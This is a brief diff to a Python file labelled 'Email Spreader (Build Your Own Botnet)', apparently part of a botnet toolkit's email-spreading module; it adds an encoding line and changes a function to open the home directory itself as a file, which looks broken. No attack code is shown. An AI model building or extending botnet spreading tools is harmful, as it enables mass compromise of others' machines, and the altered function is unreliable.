@@ -1,4 +1,5 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
 'Email Spreader (Build Your Own Botnet)'
 
 # standard library
@@ -81,7 +82,7 @@ class inline(str):
     pass
 
 def find_user_home_path():
-    with open(os.path.expanduser("~/.yagmail")) as f:
+    with open(os.path.expanduser("~")) as f:
         return f.read().strip()
 
 def validate_email_with_regex(email_address):
